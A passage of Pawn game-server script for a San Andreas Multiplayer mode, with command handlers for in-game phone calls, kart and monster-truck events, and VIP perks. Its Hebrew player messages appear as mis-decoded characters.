		new id = ReturnUser(cmd,playerid);
		if(!GetMoney(playerid)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьф·ў∙° ьЄЎюъ");
		if(playerinfo[id][phone] == -1)
		{
			SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя ЇьрЇхя");
			format(string,sizeof(string)," /Mode 39 :Ёщёф ьф·ў∙° рьщъ, рсь рщя ьъ ЇьрЇхя. ьющуЄ Ёхёє %s",GetName(playerid));
			return SendClientMessage(id,red,string);
		}
		if(playerinfo[playerid][calling] != -1)
		{
			format(string,sizeof(string)," .%s р·ф ыс° юус° сЇьрЇхя Єэ",GetName(playerinfo[playerid][calling]));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(playerinfo[id][calling] != -1)
		{
			format(string,sizeof(string)," .ыс° юус° сЇьрЇхя Єэ ∙чўя рч° %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		format(string,sizeof(string)," /answer :ю·ў∙° рьщъ! | ыущ ьЄЁх· %s",GetName(playerid));
		SendClientMessage(id,lightblue,string);
		PlaySound(playerid,3600);
		format(string,sizeof(string)," ...%s р·ф ю·ў∙° ыЄ· рь",GetName(id));
		SendClientMessage(playerid,green,string);
   		playerinfo[playerid][calling] = id;
   		playerinfo[id][calling] = playerid;
		playerinfo[playerid][callid] = 1;
		playerinfo[playerid][caller] = 1;
		playerinfo[playerid][callcash] = 0;
		PlayerStartUseCellPhone(playerid);
		return 1;
	}
	if(equal(cmd,"/pcall"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_phone || !IsPlayerInCheckpoint(playerid) || GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьщу шьЇхя Ўщсх°щ ь∙щюх∙ сЇўхуф цх");
		if(cpinfo[playerinfo[playerid][cp]][cpused] != INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .ющ∙фх ыс° ю∙·ю∙ сшьЇхя фЎщсх°щ фцф, Єьщъ ьфю·щя");
		new string[M_S];
		cmd = strtok(cmdtext, idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pcall [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!GetMoney(playerid)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє");
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьф·ў∙° ьЄЎюъ");
		if(playerinfo[id][phone] == -1)
		{
			SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя ЇьрЇхя");
			format(string,sizeof(string)," /Mode 39 :Ёщёф ьф·ў∙° рьщъ, рсь рщя ьъ ЇьрЇхя. ьющуЄ Ёхёє %s",GetName(playerid));
			return SendClientMessage(id,red,string);
		}
		if(playerinfo[playerid][calling] != -1)
		{
			format(string,sizeof(string)," .%s р·ф ыс° юус° сЇьрЇхя Єэ",GetName(playerinfo[playerid][calling]));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(playerinfo[id][calling] != -1)
		{
			format(string,sizeof(string)," .ыс° юус° сЇьрЇхя Єэ ∙чўя рч° %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		format(string,sizeof(string)," /answer :ю·ў∙° рьщъ срюЎЄх· шьЇхя Ўщсх°щ! | ыущ ьЄЁх· %s",GetName(playerid));
		SendClientMessage(id,lightblue,string);
		PlaySound(playerid,3600);
		format(string,sizeof(string)," ...%s р·ф ю·ў∙° ыЄ· рь",GetName(id));
		SendClientMessage(playerid,green,string);
   		playerinfo[playerid][calling] = id;
   		playerinfo[id][calling] = playerid;
		playerinfo[playerid][callid] = 1;
		playerinfo[playerid][caller] = 1;
		playerinfo[playerid][callcash] = 0;
		playerinfo[playerid][publicphone] = playerinfo[playerid][cp];
		cpinfo[playerinfo[playerid][cp]][cpused] = playerid;
		PlayerStartUseCellPhone(playerid);
		return 1;
	}
	if(equal(cmd,"/answer"))
	{
		if(playerinfo[playerid][calling] == -1 || playerinfo[playerid][caller]) return SendClientMessage(playerid,red," .рє рчу ьр ю·ў∙° рьщъ");
		if(playerinfo[playerid][canswer]) return SendClientMessage(playerid,lightblue," /hangup :р·ф ыс° юус° сЇьрЇхя. ьЁщ·хў");
		new string[M_S];
		format(string,sizeof(string)," .ЄЁф ьъ, р·ф щыхь ьус° Єэ ы·щс· ф·х @ с·чщь· ыь фхуЄф %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][calling],green,string);
		format(string,sizeof(string)," .р·ф щыхь ьус° Єэ ы·щс· ф·х @ с·чщь· ыь фхуЄф ,%s ЄЁщ· ь",GetName(playerinfo[playerid][calling]));
		SendClientMessage(playerid,green,string);
		playerinfo[playerid][canswer] = 1;
		playerinfo[playerid][caller] = 0;
		playerinfo[playerid][callcash] = 0;
  		playerinfo[playerinfo[playerid][calling]][canswer] = 1;
		playerinfo[playerinfo[playerid][calling]][callid] = 1;
		PlayerStartUseCellPhone(playerid);
		return 1;
	}
	if(equal(cmd,"/hangup"))
	{
		if(playerinfo[playerid][calling] == -1) return SendClientMessage(playerid,red," .р·ф ьр юус° сЇьрЇхя");
		new string[M_S];
		format(string,sizeof(string)," .Ёщ·ў р· ф∙щчф %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][calling],green,string);
		SendClientMessage(playerid,green," .Ёщ·ў· р· ф∙щчф");
		PlayerStopUseCellPhone(playerid);
		PlayerStopUseCellPhone(playerinfo[playerid][calling]);
		if(playerinfo[playerid][publicphone] > 0)
		{
			cpinfo[playerinfo[playerid][publicphone]][cpused] = INVALID_PLAYER_ID;
			playerinfo[playerid][publicphone] = 0;
		}
		else if(playerinfo[playerinfo[playerid][calling]][publicphone] > 0)
		{
			cpinfo[playerinfo[playerinfo[playerid][calling]][publicphone]][cpused] = INVALID_PLAYER_ID;
			playerinfo[playerinfo[playerid][calling]][publicphone] = 0;
		}
		playerinfo[playerinfo[playerid][calling]][calling] = -1;
		playerinfo[playerinfo[playerid][calling]][canswer] = 0;
		playerinfo[playerinfo[playerid][calling]][callid] = 0;
		playerinfo[playerinfo[playerid][calling]][caller] = 0;
		playerinfo[playerinfo[playerid][calling]][callcash] = 0;
		playerinfo[playerid][calling] = -1;
		playerinfo[playerid][canswer] = 0;
		playerinfo[playerid][callid] = 0;
		playerinfo[playerid][caller] = 0;
		playerinfo[playerid][callcash] = 0;
		playerinfo[playerid][noticedmsg][4] = 0;
		return 1;
	}
	if(equal(cmd,"/kart"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /kart [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /kart state :фЁхычщ· Kart фЎт· юЎс ·ч°х· ф");
			SendClientMessage(playerid,white," /kart join :Kart фЎш°Їх· ь·ч°х· ф");
			SendClientMessage(playerid,white," /kart quit :Kart Ї°щ∙ф ю·ч°х· ф");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /kart start :чу∙ф Kart ф·чь· ·ч°х·");
				SendClientMessage(playerid,white," /kart end [reason] :фЁхычщ· Kart ёщхэ ·ч°х· ф");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(kartinfo[0])
			{
				if(kartinfo[2] > 1)
				{
					format(string,sizeof(string)," .хфщр ··чщь сЄху %d ∙Ёщх· Kart щ∙ ыЄ· ·ч°х·",kartinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .хфщр ыс° ф·чщьф Kart щ∙ ыЄ· ·ч°х·");
			}
			else SendClientMessage(playerid,red," .Kart рщя ыЄ· ·ч°х·");
		}
		else if(equal(cmd,"join"))
		{
			if(!kartinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Kart рщя ·ч°х·");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitkart]) return SendClientMessage(playerid,red," .··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх· Kart ·ч°х· ф");
			if(playerinfo[playerid][inkart]) return SendClientMessage(playerid,red," .Kart р·ф ыс° с·ч°х· ф");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(kartinfo[1] >= sizeof(KartPositions)) return SendClientMessage(playerid,red," .·Їхёщэ Kart ыь фюўхюх· с·ч°х· ф");
			if(kartinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitkart] = 1;
			playerinfo[playerid][kartv] = CreateVehicleEx(571,KartPositions[kartinfo[1]][0],KartPositions[kartinfo[1]][1],KartPositions[kartinfo[1]][2],KartPositions[kartinfo[1]][3],-1,-1,respawntime,0,world_kart);
			kartinfo[1]++;
			vehicleinfo[playerinfo[playerid][kartv]][kartdriver] = playerid;
			SendClientMessage(playerid,lightblue," Х Х :Kart фЎш°Ї· ь·ч°х· ф Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьф·Ёт∙ сю·ч°щэ фрч°щэ ∙фЎш°Їх ьЇЄщьх· хьфЄщє рх·э юфсЁщщя");
			SendClientMessage(playerid,green," - ю·ч°ф ∙ЁхЇь юфсЁщщя ЁЇёь, фрч°хя ∙Ё∙р° Єь фсЁщщя юЁЎч");
			SendClientMessage(playerid,green," - !хЄху Godmod, Kill, Vehicle Repair ·хъ ыущ фЇЄщьх· щхЇщЄх ЇщўрЇщэ юёхт");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",kartinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!kartinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Kart рщя ·ч°х·");
			if(!playerinfo[playerid][inkart]) return SendClientMessage(playerid,red," .Kart р·ф ьр с·ч°х· ф");
			SendClientMessage(playerid,green," .Kart Ї°∙· ю·ч°х· ф");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(kartinfo[0]) return SendClientMessage(playerid,red," .Kart ыс° щ∙ ·ч°х·");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartKart();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!kartinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Kart рщя ·ч°х·");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndKart(reason,playerid);
		}
		else SendClientMessage(playerid,red," .∙тхщф Kart рЇ∙°х· ·ч°х·");
		return 1;
	}
	if(equal(cmd,"/monster"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /monster [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /monster state :фЁхычщ· Monster фЎт· юЎс ·ч°х· ф");
			SendClientMessage(playerid,white," /monster join :Monster фЎш°Їх· ь·ч°х· ф");
			SendClientMessage(playerid,white," /monster quit :Monster Ї°щ∙ф ю·ч°х· ф");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /monster start :чу∙ф Monster ф·чь· ·ч°х·");
				SendClientMessage(playerid,white," /monster end [reason] :фЁхычщ· Monster ёщхэ ·ч°х· ф");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(monsterinfo[0])
			{
				if(monsterinfo[2] > 1)
				{
					format(string,sizeof(string)," .фў°с щ·чщь сЄху ,Monster щ∙ ыЄ· ·ч°х· %d ∙Ёщх·",monsterinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .хфў°с ыс° ф·чщь Monster щ∙ ыЄ· ·ч°х·");
			}
			else SendClientMessage(playerid,red," .Monster рщя ыЄ· ·ч°х·");
		}
		else if(equal(cmd,"join"))
		{
			if(!monsterinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Monster рщя ·ч°х·");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitmonster]) return SendClientMessage(playerid,red," .··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх· Monster ·ч°х· ф");
			if(playerinfo[playerid][inmonster]) return SendClientMessage(playerid,red," .Monster р·ф ыс° с·ч°х· ф");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(monsterinfo[1] >= sizeof(MonsterPositions)) return SendClientMessage(playerid,red," .·Їхёщэ Monster ыь фюўхюх· с·ч°х· ф");
			if(monsterinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitmonster] = 1;
			playerinfo[playerid][monsterv] = CreateVehicleEx(556,MonsterPositions[monsterinfo[1]][0],MonsterPositions[monsterinfo[1]][1],MonsterPositions[monsterinfo[1]][2],MonsterPositions[monsterinfo[1]][3],-1,-1,respawntime,15,world_monster);
			monsterinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :Monster фЎш°Ї· ь·ч°х· ф Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьф·Ёт∙ с∙р° фю·ч°щэ хьфх°щу ьфэ ыюф ∙щх·° чщщэ");
			SendClientMessage(playerid,green," - фрч°хя ∙Ё∙р° Єэ °ыс ∙ьр ф·ЇхЎї, юЁЎч");
			SendClientMessage(playerid,green," - !хЄху Godmod, Kill, Vehicle Repair ·хъ ыущ фЇЄщьх· щхЇщЄх ЇщўрЇщэ юёхт");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",monsterinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!monsterinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Monster рщя ·ч°х·");
			if(!playerinfo[playerid][inmonster]) return SendClientMessage(playerid,red," .Monster р·ф ьр с·ч°х· ф");
			SendClientMessage(playerid,green," .Monster Ї°∙· ю·ч°х· ф");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(monsterinfo[0]) return SendClientMessage(playerid,red," .Monster ыс° щ∙ ·ч°х·");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartMonster();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!monsterinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Monster рщя ·ч°х·");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndMonster(reason,playerid);
		}
		else SendClientMessage(playerid,red," .∙тхщф Monster рЇ∙°х· ·ч°х·");
		return 1;
	}
	if(equal(cmd,"/viplist"))
	{
		new string[M_S_D], str[M_S], vips = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0) vips++;
		vips = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][vip])
		{
			new vlevelname[32];
			if(playerinfo[i][vip] == 1) vlevelname = "{996600}V.I.P Bronze";
			else if(playerinfo[i][vip] == 2) vlevelname = "{d3d3d3}V.I.P Silver";
			else if(playerinfo[i][vip] == 3) vlevelname = "{ffcc00}V.I.P Gold";
		    vips++;
            format(str, sizeof(str), "{27DE55}%d. %s [ID: %03d | VIP Type: %s{27DE55}]\n",vips,GetName(i),i,vlevelname), strcat(string, str);
		}
		ShowPlayerDialog(playerid,dialog_admins,DIALOG_STYLE_MSGBOX,"V.I.P Team",string,"OK","");
		if(!vips) return SendClientMessage(playerid,red," .рщя ыЄ· ∙чўЁщ ысху ючхс°щэ");
		return 1;
	}
	if(equal(cmd,"/vbonus"))
	{
		new string[M_S], cur = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /vbonus [number] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /vbonus 1 :VIP схЁхёщэ ыььщщэ ь");
			SendClientMessage(playerid,white," /vbonus 2 :фЁчх· Єь ючщ°щ Ё∙ўщэ");
			SendClientMessage(playerid,white," /vbonus 3 :·хёЇ· Єь ыёЇщэ юЁыёщэ");
			SendClientMessage(playerid,white," /vbonus 4 :·хёЇ· Єь ыёЇщэ юрцх°щ ыёє");
			return 1;
		}
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessage(playerid,lightblue," ~~~ :VIP схЁхёщэ ющхчущэ ью∙·ю∙щ ~~~");
				SendClientMessage(playerid,yellow," Х ющхчу· VIP ∙щтх° ьюЇўу·");
				SendClientMessage(playerid,yellow," Х фтЁф юЇЁщ шщьщэ рхшхюшщщэ сюЇўуф хсЎср");
				SendClientMessage(playerid,yellow," Х (/Mode 40 Їўхух· ∙хЁх· ютЁщсх· (°рф");
				SendClientMessage(playerid,yellow," Х ·хёЇ· ысху сёшшщёшщўх·");
				SendClientMessage(playerid,yellow," Х фЁчх· Єь ючщ°щ фЁ∙ўщэ");
				SendClientMessage(playerid,yellow," Х ·хёЇх· Єь ыёЇщэ юЁыёщэ");
			}
			case 2:
			{
				SendClientMessage(playerid,lightblue," ~~~ :фЁчх· Єь ючщ°щ Ё∙ўщэ ~~~");
				SendClientMessage(playerid,brown," (VIP Level. Percent Discounts)");
				cur = 0;
				for(new i=0;i<sizeof(VIP_WeaponDiscount); i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %d %%") : ("%s | %d. %d %%"),string,i,VIP_WeaponDiscount[i]);
					cur++;
					if(cur >= 4)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(VIP_WeaponDiscount)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			case 3:
			{
				SendClientMessage(playerid,lightblue," ~~~ :·хёЇ· рчхцщэ Єь ыёЇщэ юЁыёщэ ~~~");
				SendClientMessage(playerid,brown," (VIP Level. Percent Additions)");
				cur = 0;
				for(new i=0;i<sizeof(VIP_PropertyPercentAdditions);i++)
				{
					format(string,sizeof(string),!cur ? (" %s%d. %.0f %%") : ("%s | %d. %.0f %%"),string,i,VIP_PropertyPercentAdditions[i]);
					cur++;
					if(cur >= 4)
					{
						SendClientMessage(playerid,yellow,string);
						string = "", cur = 0;
					}
					else if(i == sizeof(VIP_PropertyPercentAdditions)-1) SendClientMessage(playerid,yellow,string);
				}
			}
			case 4:
			{
				SendClientMessage(playerid,lightblue," ~~~ :·хёЇ· рчхцщэ Єь ыёЇщэ юрцх°щ ыёє ~~~");
				SendClientMessage(playerid,brown," (VIP Level. Cash Additions)");
				cur = 0;
				for(new i = 1; i <= 3; i++)
				{
					format(string,sizeof(string)," %d. %d$",i,i*10);
					SendClientMessage(playerid,yellow,string);
				}
			}
			default: SendClientMessage(playerid,red," .рЇ∙°х· Єц°ф ∙тхщф");
		}
		return 1;
	}
	if(equal(cmd,"/fviplist") && IsPlayerMAdmin(playerid))
	{
		new File:f, string[M_S], read[M_S], vips = 0, lvl, id[32];
		fileCheck(file_vip);
		SendClientMessage(playerid,lightblue," ~~~ :VIP °∙щю· ю∙·ю∙щ ~~~");
		f = fopen(file_vip,io_read);
		while(fread(f,read,sizeof(read),false))
		{
			vips++;
			split(read,fviplist,'=');
			lvl = strval(fviplist[1]);
			if(IsPlayerConnected(ReturnUser(fviplist[0],playerid))) valstr(id,ReturnUser(fviplist[0],playerid));
			else id = "ьр ючхс°";
			format(string,sizeof(string)," Х %d. %s [ID: %s | VIP Level: %d]",vips,fviplist[0],id,lvl);
			SendClientMessage(playerid,strlen(id) == 8 ? yellow : lightyellow,string);
			fviplist[0] = "", fviplist[1] = "";
		}
		fclose(f);
		if(!vips) SendClientMessage(playerid,red," .VIP рщя ю∙·ю∙щ");
		else
		{
			format(string,sizeof(string)," .VIP ёъ фыь %d ю∙·ю∙щ",vips);
			SendClientMessage(playerid,green,string);
		}
		SendClientMessage(playerid,lightblue," ~~~~~~~~~~~~~~~~~~~~");
		return 1;
	}
	if(equal(cmd,"/camera"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сюЎьюх· VIP Єьщъ ьфщх· ю∙·ю∙");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сюЎьюх· ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сюЎьюх· ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сюЎьюх· ыр∙° р·ф ссчщ°· уюхщх·");
		if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сюЎьюх· ыр∙° р·ф срцх° ущ-рэ");
		if(playerinfo[playerid][incam]) return SendClientMessage(playerid,red," /cameraoff :р·ф ыс° ЎхЇф сюЎьюф, ьыщсхщ");
		new string[M_S], count = sizeof(VIPCamera)-1, camid;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /camera [0-%d] :Ўх°· ф∙щюх∙",count);
			SendClientMessage(playerid,white,string);
			return 1;
		}
		camid = strval(cmd);
		if(camid < 0 || camid > count) return SendClientMessage(playerid,red," .юёЇ° юЎьюф ∙тхщ");
		SavePlayerPos(playerid);
		playerinfo[playerid][incam] = 1;
		SetPlayerPos(playerid,VIPCamera[camid][0],VIPCamera[camid][1],VIPCamera[camid][2]+50.0);
		SetPlayerCameraPos(playerid,VIPCamera[camid][0],VIPCamera[camid][1],VIPCamera[camid][2]);
		SetPlayerCameraLookAt(playerid,VIPCamera[camid][3],VIPCamera[camid][4],VIPCamera[camid][5]);
		format(string,sizeof(string),"~y~]~r~camera~n~~h~number ~h~%d~y~]",camid);
		GameTextForPlayer(playerid,string,1500,4);
		return 1;
	}
	if(equal(cmd,"/cameraoff"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сюЎьюх· VIP Єьщъ ьфщх· ю∙·ю∙");
		if(!playerinfo[playerid][incam]) return SendClientMessage(playerid,red," .рщЁъ ЎхЇф сюЎьюф");
		SetCameraBehindPlayer(playerid);
		LoadPlayerPos(playerid);
		playerinfo[playerid][incam] = 0;
		return 1;
	}
	if(equal(cmd,"/vahelp"))
	{
	    if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх·");
		if(playerinfo[playerid][vip] >= 1) SendClientMessage(playerid,white,"{996600}V.I.P Bronze: {ffffff}/Camera /CameraOff /VIPColor /STele /VMessage");
		if(playerinfo[playerid][vip] >= 2) SendClientMessage(playerid,white,"{d3d3d3}V.I.P Silver: {ffffff}/VHeal /CarJump");
		if(playerinfo[playerid][vip] >= 3) SendClientMessage(playerid,white,"{ffcc00}V.I.P Gold: {ffffff}/QDefence /VRocket /VSuicide");
		return 1;
	}
	if(equal(cmd,"/vipcolor"))
	{
		cmd = strtok(cmdtext,idx);
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх·");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /vipcolor [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			SendClientMessage(playerid,vipcol," .фхЇЄь VIP ЎсЄ");
			SetPlayerColor(playerid,setAlpha(vipcol,PLAYER_ALPHA));
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,setAlpha(vipcol,PLAYER_ALPHA));
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			SendClientMessage(playerid,vipcol," .фхЇёў VIP ЎсЄ");
			SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/stele"))
	{
		if(!Options[6][optActive] && !playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle][1] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙т° °ыс ючЁх· фюыхЁщх· ∙ьр ∙щщъ ьъ");
		new Float:h, string[1024], tname[M_S];
		GetPlayerHealth(playerid,h);
		if(h < min_tele_health)
		{
			format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
			return SendClientMessage(playerid,red,string);
		}
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_private)
		{
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		ShowPlayerDialog(playerid,dialog_stele,DIALOG_STYLE_LIST,@c(lightblue) "VIP ∙щтх°щ",string,"∙щтх°","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/vmessage"))
	{
		new text[256], string[M_S];
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if((chatlocked || playerinfo[playerid][mute][0] > 0) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ьр ·хыь ьф∙·ю∙ сЇўхуф фцх сюЎсъ фЁхычщ");
		text = strrest(cmdtext,idx);
		if(!strlen(text)) return SendClientMessage(playerid,white," /vmessage [text] :Ўх°· ф∙щюх∙");
		if(equal(playerinfo[playerid][lastvmessage],text)) return SendClientMessage(playerid,red," !vmessage рёх° ьфЎщє с");
		format(string,sizeof(string)," ** [VIP Message] %s: %s",GetName(playerid),text);
		SendClientMessageToAll(vipcol,string);
		SetString(playerinfo[playerid][lastvmessage],text);
		return 1;
	}
	if(equal(cmd,"/vheal"))
	{
		new string[M_S];
